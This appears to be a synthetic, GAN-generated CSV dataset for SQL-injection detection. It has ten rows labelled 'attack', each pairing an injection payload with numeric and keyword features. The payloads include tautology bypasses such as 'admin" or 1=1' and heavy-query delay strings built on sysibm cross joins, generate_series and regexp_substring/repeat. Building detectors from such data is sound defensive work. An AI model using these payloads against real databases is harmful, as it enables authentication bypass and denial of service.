id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000203,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'gsup'  =  'gsup",nearest_attack_euclidean,R002271,4.597664187408504,167.17462158203125,29.617259979248047,20.411212921142578,63.134437561035156,0.02661922574043274,31.223594665527344,21.107038497924805,0.9989197254180908,0.2922256886959076,0.24932877719402313,0.4012295603752136,0.1343710869550705,3.1048314571380615,2.7896649837493896,1.217397689819336,-0.3310909867286682,-0.0865982174873352,-0.014826932922005653,0.03767845034599304,5.438004970550537,4.348316192626953,1.992356300354004,0.015734221786260605,1.4537818431854248,0.0041786436922848225,-0.0495569221675396,-0.03300350531935692,-0.3098640441894531,0.18311606347560883,-0.08013275265693665,0.005894215777516365,0.19282810389995575,-0.5365461111068726,-0.2722015380859375,1.4857771396636963,6.0204548835754395,1.8805115222930908,-0.04273122549057007,-0.011481785215437412,-0.12843266129493713,-0.13494065403938293,0.6068520545959473,0.07852105796337128,0.24120324850082397,-0.05213272571563721,0.12085528671741486,0.31775030493736267,0.350260466337204,0.24571189284324646,0.07268728315830231,0.14789608120918274,0.26707518100738525,0.020816802978515625,-0.5583847761154175,0.2668180465698242,0.02487459033727646,0.16434672474861145,0.06111719459295273,0.2374086081981659,-0.004092165268957615,0.05803234130144119,-0.010773785412311554,1.3293536901474,-0.24285690486431122,0.10239680111408234,-0.0911506786942482,-0.16064786911010742,0.6018397212028503,0.4464261531829834,-0.3217306137084961,0.0963611826300621,-0.1960565745830536,0.04957348480820656,-0.25163474678993225,-0.002057479927316308,1.2821073532104492,0.5802126526832581,0.0031275658402591944,0.2626499831676483,0.0942898690700531,5.650284767150879,1.0141841173171997,0.45190900564193726,0.3168404698371887,-0.4258919358253479,-0.1836429089307785,-0.5719802379608154,-0.03998024761676788
GAN_000204,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   'btnl'  =  'btnl",nearest_attack_euclidean,R003179,9.384049328795681,113.31572723388672,53.161441802978516,-3.9845166206359863,36.52497482299805,0.015946241095662117,86.4352035522461,2.7832770347595215,0.9942372441291809,0.7186762094497681,0.14812128245830536,0.30092406272888184,0.10500213503837585,3.7186224460601807,4.3061394691467285,1.5991486310958862,-1.8283729553222656,-0.05902823433279991,-0.6479981541633606,-0.020730547606945038,0.4062362611293793,-1.5374850034713745,2.2826812267303467,-0.006660476326942444,0.8612408638000488,0.037628646939992905,-0.05909914895892143,-0.9456723928451538,-3.496802806854248,1.231913685798645,-0.1112203449010849,0.009794444777071476,-0.31289803981781006,-0.15395572781562805,-0.4249510169029236,0.23828937113285065,4.904757499694824,2.318328857421875,-0.9880204200744629,-0.002688985550776124,-0.7356085777282715,0.3010411262512207,1.4141944646835327,0.5589109063148499,0.23323595523834229,-0.7892149686813354,-0.060659728944301605,-0.11237040907144547,-0.03290409594774246,0.5478443503379822,-0.0561232790350914,-0.19807566702365875,0.5083853602409363,-0.38339343667030334,-1.7798693180084229,-0.6664496064186096,-0.038761403411626816,1.5174405574798584,0.9642221331596375,0.3169911801815033,-0.0046805888414382935,0.12854567170143127,-0.013552328571677208,0.801433801651001,-1.474226951599121,0.26464661955833435,-0.37275609374046326,1.1759587526321411,0.4272313714027405,0.7993106245994568,-0.9154233336448669,-0.00944056361913681,-0.4669085443019867,0.20485854148864746,-1.4764604568481445,-0.012906638905405998,1.7157305479049683,0.35053032636642456,-0.013571281917393208,0.3434951603412628,0.23445743322372437,2.5708658695220947,1.147116780281067,-0.37944266200065613,0.4160497486591339,-1.6739214658737183,0.21354128420352936,-0.19690996408462524,-0.0330519825220108
GAN_000205,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   'btnl'  =  'btnl",nearest_attack_euclidean,R003179,7.642769325233661,168.08282470703125,93.5382080078125,8.588212013244629,28.47481346130371,0.15513339638710022,98.80742645263672,29.269208908081055,0.9946866631507874,0.6931665539741516,-0.017675355076789856,0.28382575511932373,0.08868569135665894,3.660681962966919,2.7638444900512695,1.1769083738327026,1.3789405822753906,-0.13562415540218353,-0.5116304755210876,-0.14163519442081451,1.8120650053024292,-1.3409322500228882,1.7120311260223389,0.042517781257629395,1.5321532487869263,0.04187319055199623,0.08211198449134827,-0.5434057116508484,-1.1800165176391602,2.0149595737457275,-0.05594274029135704,-0.0015646829269826412,0.10613375902175903,0.7101933360099792,0.6153302788734436,1.3150620460510254,-1.8259471654891968,1.826704978942871,0.5350795984268188,-0.00585450604557991,0.629939079284668,0.9932809472084045,1.2013992071151733,0.7822363972663879,0.7294392585754395,-0.6382980346679688,-0.39930105209350586,-0.10817616432905197,0.10035006701946259,0.48188677430152893,-0.054395951330661774,-0.1551099568605423,-0.7182539701461792,-0.2297143191099167,-1.6461968421936035,-1.071620225906372,0.06962614506483078,1.5477027893066406,0.26438000798225403,0.6195427179336548,0.008831864222884178,-0.13851246237754822,-0.00703303562477231,1.7880799770355225,-0.09290173649787903,0.260895699262619,-0.03617270290851593,0.8912547826766968,-0.18945066630840302,0.25437334179878235,-0.3479405641555786,-0.9746288657188416,-0.2573193609714508,0.033881641924381256,-1.0027490854263306,-0.004878306295722723,1.6721725463867188,0.21729186177253723,-0.004364992491900921,-0.018951958045363426,-0.4003137946128845,3.015233278274536,1.0088850259780884,-0.6696145534515381,0.17930035293102264,-0.5182704925537109,-0.11705375462770462,-1.0198323726654053,0.0709671899676323
GAN_000206,attack,boolean,1'  )   and 7533  =  7533 and   (  'xyga' like 'xyga,nearest_attack_euclidean,R002946,5.673345082583377,26.0374813079834,37.87096405029297,-1.3822561502456665,0.306365966796875,0.0028073680587112904,29.52880859375,-2.961987018585205,0.9968038201332092,0.3790991008281708,0.1782335489988327,0.36356163024902344,0.12259457260370255,3.5503287315368652,3.0202417373657227,2.403596878051758,0.01235484890639782,-0.10818244516849518,0.03342908248305321,-0.09215621650218964,0.6759546995162964,-0.7337254285812378,1.7591331005096436,0.01563490554690361,0.9106627702713013,0.025179848074913025,0.014308531768620014,-0.38958361744880676,-0.6248365640640259,0.6084946990013123,-0.06714865565299988,0.001401031157001853,0.022076338529586792,-0.06290684640407562,0.004965835716575384,0.897373378276825,2.6664316654205322,1.608461856842041,-0.37450599670410156,-0.018125886097550392,-0.22991618514060974,0.04064726456999779,1.2148185968399048,0.3434925079345703,-0.28004270792007446,-0.5933750867843628,-0.49751192331314087,-0.1578523814678192,0.18119317293167114,0.42538151144981384,-0.01043737679719925,-0.09429091215133667,-0.016008220613002777,0.09301593899726868,-1.1965354681015015,-0.10120651125907898,0.005389159079641104,0.5520897507667542,0.1175587996840477,0.5043942928314209,0.004273712169378996,-0.03400905430316925,-0.0077185132540762424,-1.4779329299926758,-0.5000159740447998,0.08003051578998566,-0.2289704829454422,0.20108862221240997,0.4161413311958313,0.6225267648696899,-0.37548840045928955,-0.04812973737716675,-0.042755402624607086,0.04811727628111839,-0.4855809807777405,-0.012006988748908043,1.2330290079116821,0.5550068616867065,0.0033139297738671303,0.33532899618148804,-0.23539245128631592,0.727979838848114,1.0872162580490112,0.003390468657016754,0.7291623950004578,-0.34684884548187256,0.5194395184516907,-0.4446611702442169,-0.008495522662997246
GAN_000207,attack,boolean,"1'   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'miba'  =  'miba",nearest_attack_euclidean,R001278,6.012800484415207,121.88139343261719,64.77227020263672,18.16172981262207,43.2035026550293,-0.025277260690927505,65.38668823242188,26.595544815063477,0.995922327041626,0.49386411905288696,0.08273957669734955,0.2895232141017914,0.12112803012132645,3.684215545654297,3.30495285987854,0.4643549621105194,0.9371752142906189,-0.08700394630432129,-0.363470196723938,-0.053956832736730576,5.568300247192383,1.7971926927566528,2.0747969150543213,0.011199753731489182,1.4989434480667114,0.04295767471194267,0.021896641701459885,-0.38841143250465393,-0.24993209540843964,1.4725061655044556,-0.06281846016645432,-0.007024561055004597,0.11846085637807846,0.41604554653167725,0.40614643692970276,1.436569094657898,1.9259638786315918,1.700000286102295,0.15812242031097412,-0.01405004970729351,0.6169136166572571,0.6277248859405518,1.0875749588012695,0.13873395323753357,0.5459849834442139,-0.29316848516464233,-0.36047446727752686,-0.06858151406049728,0.29673075675964355,0.5527290105819702,0.04347536712884903,-0.05309690162539482,0.2454022765159607,-0.3066202402114868,-1.1935231685638428,-0.3407962918281555,0.040505338460206985,0.8886205554008484,0.17551833391189575,0.5390406250953674,0.003518136218190193,0.0028480812907218933,-0.0016194002237170935,2.155438184738159,-0.7209179997444153,0.1908772885799408,-0.0786980539560318,0.15593449771404266,0.16593194007873535,0.46706900000572205,-0.6047933101654053,-0.30039966106414795,0.18369945883750916,0.05296412855386734,-0.9114105701446533,-0.009687453508377075,1.4486888647079468,0.15927726030349731,-0.005829178728163242,0.147442027926445,-0.09710539877414703,4.591389179229736,1.0956932306289673,-0.31270718574523926,0.5139316320419312,-0.7241348624229431,0.03507094830274582,-0.2727695405483246,0.07961545139551163
GAN_000208,attack,boolean,"1'   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'cenk'  =  'cenk",nearest_attack_euclidean,R001268,6.6150735449775135,336.1625671386719,57.80493927001953,38.5018310546875,125.19420623779297,0.10239576548337936,70.82667541503906,48.426116943359375,1.0003858804702759,0.2619367837905884,0.2879902720451355,0.4652904272079468,0.10770342499017715,2.742478609085083,3.3492610454559326,1.6147868633270264,-0.6719678044319153,-0.25971364974975586,0.01951012946665287,0.04214118793606758,11.251718521118164,7.5601348876953125,2.0704002380371094,-0.0025428866501897573,1.9820947647094727,-0.004909600131213665,-0.0757206454873085,-0.12089475989341736,0.36702960729599,0.4092872440814972,-0.04324031248688698,0.009813412092626095,0.31941553950309753,-0.5572038292884827,-0.5168749094009399,1.7773224115371704,6.6881327629089355,3.095780611038208,0.06957131624221802,-0.009316520765423775,0.10573296248912811,-0.31992200016975403,0.43771666288375854,0.3832474946975708,0.4723833203315735,0.3305186331272125,0.8672407865524292,0.757557213306427,0.5913220643997192,0.3818647861480713,0.14402613043785095,0.3415081799030304,0.24131760001182556,0.3441474735736847,-0.646141767501831,0.7571291327476501,0.04682603478431702,0.10247134417295456,0.10803575068712234,0.023498859256505966,-0.01337865088135004,0.7424414753913879,-0.014391847886145115,2.721595287322998,-0.22961020469665527,0.1922212392091751,-0.0029396212194114923,0.028915822505950928,0.6469047665596008,-0.08371711522340775,-0.13306967914104462,-0.05853624641895294,-0.3045348823070526,0.052334774285554886,-0.17317315936088562,-0.002100894460454583,1.7576422691345215,0.36743637919425964,-0.0020555565133690834,-0.07093972712755203,-0.018827520310878754,8.074359893798828,0.8770579099655151,0.6264135837554932,0.44983428716659546,-0.3510957360267639,-0.5814579129219055,-0.9667602181434631,-0.026675080880522728
GAN_000209,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'gsup'  =  'gsup",nearest_attack_euclidean,R002271,4.9238766260478855,140.0916290283203,25.845470428466797,11.908673286437988,47.72315216064453,0.02870657481253147,48.24983215332031,6.808557033538818,0.9992066025733948,0.3646240234375,0.25148990750312805,0.40058833360671997,0.13032814860343933,3.3558993339538574,2.7720420360565186,1.8814420700073242,-0.8499169945716858,-0.03207391873002052,-0.008764611557126045,0.014292712323367596,2.2172505855560303,2.8925998210906982,2.075731039047241,-0.0006565026706084609,1.1611720323562622,0.0014997103717178106,-0.06826696544885635,-0.0972575843334198,-0.7273403406143188,0.2180352807044983,-0.05036929249763489,0.007010655477643013,0.07854783535003662,-0.4912983179092407,-0.36292243003845215,0.9674093127250671,6.174209117889404,1.7629070281982422,-0.3183785676956177,-0.007158299908041954,-0.6053141951560974,-0.1341431438922882,0.6889162659645081,0.1553138792514801,-0.28147822618484497,-0.09941567480564117,-0.09681662172079086,0.22799217700958252,0.20217381417751312,0.18727880716323853,0.06111966446042061,0.03723369911313057,0.11466208100318909,-0.11376889050006866,-0.7826013565063477,0.25383812189102173,-0.009674828499555588,0.5080033540725708,0.11059033125638962,-0.0208834707736969,-0.006070465315133333,0.3485212028026581,-0.009518168866634369,0.31711554527282715,-0.5422588586807251,0.0655304342508316,-0.18693405389785767,0.2621803879737854,0.5779719352722168,0.4606891870498657,-0.2968965768814087,0.2571871280670166,-0.2617727220058441,0.09025413542985916,-0.37498587369918823,-0.002074494957923889,1.1399651765823364,0.6174551248550415,0.0005499790422618389,0.426482617855072,-0.009946338832378387,4.192134380340576,0.9787076711654663,0.2951905131340027,0.23985950648784637,-0.5422757863998413,0.03872878849506378,-0.3722434937953949,-0.07281237095594406
GAN_000210,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and 'dfwj'  =  'dfwj",nearest_attack_euclidean,R000763,5.187750740492342,65.2132339477539,50.71581268310547,3.548767566680908,17.873245239257812,-0.030183173716068268,53.861854553222656,4.877943515777588,0.9969355463981628,0.5551033616065979,0.12935461103916168,0.3015362024307251,0.13082019984722137,3.8066537380218506,2.7438578605651855,1.1947455406188965,0.38175708055496216,0.04299934208393097,-0.27706798911094666,-0.015509209595620632,0.2574251592159271,-0.4247668981552124,2.359009265899658,-0.0005980617133900523,1.0723565816879272,0.030226396396756172,0.017639532685279846,-0.34940674901008606,-1.2231874465942383,1.137224793434143,-0.061621759086847305,-0.001816782634705305,-0.06604653596878052,0.36333680152893066,0.2870071530342102,0.8769513964653015,2.487292528152466,1.1815139055252075,-0.13560426235198975,-0.006889915093779564,-0.05004596337676048,0.5257631540298462,1.1508671045303345,0.17195609211921692,0.11877495050430298,-0.4861028492450714,-0.4975311756134033,-0.16175028681755066,0.03755458444356918,0.35038769245147705,-0.014926411211490631,-0.17057295143604279,0.07687938213348389,-0.3858961760997772,-1.1680028438568115,-0.5744671821594238,0.015725862234830856,1.0876309871673584,0.2112087607383728,0.3657110333442688,0.003479879116639495,-0.18848922848701477,-0.0052439444698393345,0.5667626261711121,-0.7489128112792969,0.12304102629423141,-0.1806887984275818,0.5607788562774658,0.21080784499645233,0.6770464181900024,-0.4575742483139038,-0.2670418620109558,-0.17598259449005127,0.0939340740442276,-0.683217465877533,-0.0070593045093119144,1.2192466259002686,0.3643132448196411,-0.006520888768136501,0.3708663284778595,-0.10031034052371979,2.759105920791626,1.0445142984390259,-0.20451447367668152,0.2878948450088501,-0.7856708765029907,0.09860160201787949,-0.14322975277900696,-0.005241419188678265
GAN_000211,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and 'dfwj'  =  'dfwj",nearest_attack_euclidean,R000763,6.88903797960153,13.411558151245117,56.17874526977539,-12.127463340759277,-8.199291229248047,-0.03880941495299339,43.10090637207031,-3.8021950721740723,0.9964550733566284,0.6248779892921448,0.15702921152114868,0.2852326035499573,0.12961627542972565,3.9132299423217773,2.7350149154663086,1.4978916645050049,-0.025234879925847054,0.06197991967201233,-0.33524590730667114,-0.030155716463923454,-1.4374507665634155,-4.163631439208984,2.0357539653778076,-0.00881779845803976,0.863399863243103,0.024880964308977127,0.03796282038092613,-0.6196731328964233,-2.5383992195129395,1.1033270359039307,-0.0639733150601387,0.002171293832361698,-0.19151617586612701,0.26644521951675415,0.33509284257888794,0.5110435485839844,2.154480457305908,1.2337464094161987,-0.27798396348953247,-0.004988540895283222,-0.3170885145664215,0.4396689534187317,1.552376627922058,0.27138227224349976,-0.0351238027215004,-0.7887622117996216,-0.524288535118103,-0.36805403232574463,-0.13580727577209473,0.3507551848888397,-0.14717188477516174,-0.2902255952358246,-0.012096837162971497,-0.3649052381515503,-1.507271647453308,-1.0815818309783936,-0.004076273180544376,1.0734776258468628,0.5370559692382812,0.5600441694259644,0.0039679924957454205,-0.3024252653121948,-0.0065493714064359665,-0.23466277122497559,-0.9654152393341064,0.1289490908384323,-0.23248375952243805,0.8447821140289307,0.21527425944805145,0.7111088037490845,-0.2294326275587082,-0.12488245964050293,-0.22340020537376404,0.11809025704860687,-0.8818742632865906,-0.01046054344624281,1.125237226486206,0.623890221118927,-0.009101632051169872,0.3662247061729431,0.07121755182743073,2.037787437438965,1.109438180923462,-0.3862564265727997,0.46749770641326904,-0.8297012448310852,0.3867243528366089,-0.0218619666993618,-0.013902883045375347
GAN_000212,attack,boolean,"admin"" or 1  =  1",nearest_attack_euclidean,R000073,6.404025441862916,-7.533060073852539,22.443984985351562,-11.02617359161377,-13.693740844726562,0.0011189669603481889,7.972597599029541,-15.540082931518555,0.998680591583252,0.3809417486190796,0.24850572645664215,0.3782098591327667,0.1271601766347885,3.4071524143218994,2.7973151206970215,2.6146974563598633,-0.38613802194595337,0.008997142314910889,0.0996803492307663,-0.04868292063474655,-2.122779369354248,-2.5703868865966797,1.8621658086776733,0.017628122121095657,0.5454578995704651,0.006177347153425217,-0.01491460669785738,-0.422384649515152,-1.0322864055633545,0.08347141742706299,-0.07721292972564697,0.008286758325994015,-0.03713556379079819,-0.2619151473045349,-0.09686756879091263,0.42443040013313293,3.58463191986084,1.3747988939285278,-0.48543882369995117,-0.01485290378332138,-0.7788569927215576,-0.16246148943901062,1.3261200189590454,0.34725284576416016,-0.5819807052612305,-0.5851680040359497,-0.6667075753211975,-0.09651397913694382,0.026107892394065857,0.1511329561471939,-0.14149335026741028,-0.18832795321941376,-0.16353677213191986,-0.037512924522161484,-1.2536734342575073,-0.3589639663696289,0.009069212712347507,0.6136201620101929,0.10211244970560074,0.2245813012123108,0.0008144772727973759,-0.12090623378753662,-0.011894883587956429,-2.0312411785125732,-0.4201910197734833,0.0358760803937912,-0.2658255100250244,0.3081773519515991,0.6298596262931824,0.7228060364723206,-0.2088584154844284,-0.08354023844003677,-0.44683748483657837,0.07460703700780869,-0.3931730091571808,-0.005239745136350393,0.9407287240028381,0.7708852887153625,0.004737941548228264,0.5663338899612427,-0.09532955288887024,0.8797456622123718,1.0534496307373047,0.16491001844406128,0.4352056086063385,-0.3764124810695648,0.5241471529006958,-0.5064674615859985,-0.08904479444026947
